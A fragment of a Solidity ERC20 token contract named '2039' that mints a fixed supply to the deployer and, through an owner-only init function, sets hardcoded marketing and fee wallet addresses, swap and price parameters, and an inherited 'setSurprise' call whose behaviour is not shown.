...
contract xia is Token {
    constructor() ERC20(
        "2039",   // 名字
        "2039"   // 符号
    ) {
        uint256 _totalSupply = 15000 ether;
        super._mint(_msgSender(), _totalSupply);
    }
    function init() public onlyOwner {
        require(!isLiquified, "already Liquified");
        address _marketing = address(0xF522a842d5d2BF1ab962da4439dffB65EDa69596); //
        ...
        super.setSurprise(
            9000,
            3,
            address(0xF522a842d5d2BF1ab962da4439dffB65EDa69596)
        );
        super.__Token_init(_marketing, _usdt, _isDividend);
        setSwapTokensAt(5 ether);
        setInitPrice(0.1 ether);
        feeMarketingTo2 = address(0xd98f352f5Aa43eFAe62680972fC45A97a49A7444);
        feeEarn = 0;
        isLiquified = true;
    }
}